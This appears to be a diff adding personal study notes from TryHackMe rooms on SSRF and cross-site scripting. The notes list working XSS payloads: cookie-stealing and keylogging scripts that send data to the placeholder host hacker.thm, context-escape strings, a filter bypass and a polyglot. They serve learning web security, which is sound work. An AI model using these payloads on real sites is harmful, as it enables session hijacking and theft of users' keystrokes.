@@ -149,3 +149,30 @@ If working with a blind SSRF where no output is reflected back to you, you'll ne
   * Allow List: allows those starting with "https://xxx.com", but you could make a domain name giving us "https://xxx.com.virus.com"
 * An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.
 * A form with profile images: give a path in it
+* https://tryhackme.com/room/ssrfqi
+
+* https://tryhackme.com/room/xssgi
+* XSS / Cross-site Scripting
+  * malicious JavaScript gets injected into a web application with the intention of being executed by other users
+  * Proof Of Concept `<script>alert('XSS');</script>`
+  * Session Stealing: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
+  * Key Logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
+  * Business Logic: call something that the user would be able to call from its browser, such as an API using the client credentials
+* **Reflected XSS**: in the parameters of a request, the page may execute the JavaScript payload
+* **Stored XSS**: store by the application, and displayed by the website (comments, profiles, listings...). Anything where the user could input something malicious.
+  * Some developers are not filtering everything. Dropdown for your age, you enter XSS, boom (the database query would fail for a int).
+* **DOM Based XSS** https://tryhackme.com/room/xssgi
+* **Blind XSS**: you can't see if the payload is working (ex: the admin-side website if any): hackers use a callback (https://xsshunter.com/ https://github.com/mandatoryprogrammer/xsshunter https://github.com/mandatoryprogrammer/xsshunter-express)
+* If inside an input `">PoC`
+* If inside a textarea `<textarea/>POC`
+* If inside some javascript string `';alert('XSS');//`
+* Bypass filter `<sscriptcript>alert('XSS');</sscriptcript>`
+* If "<" are filtered, but we are inside a tag, then we may use functions such as "onload"...
+
+```
+Polyglots:
+
+An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
